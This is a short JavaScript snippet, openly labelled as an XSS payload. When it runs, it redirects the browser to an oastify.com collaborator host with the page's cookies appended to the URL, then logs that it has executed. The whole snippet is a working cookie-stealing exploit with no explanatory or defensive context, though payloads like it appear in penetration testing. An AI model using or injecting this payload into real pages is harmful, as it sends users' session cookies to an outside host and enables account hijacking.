function xssPayload() {
  document.location="https://x1z95n4tp9dot2nj67c84ox3ruxmlb.oastify.com/" + document.cookie;
}

console.log('XSS payload executed');
xssPayload();
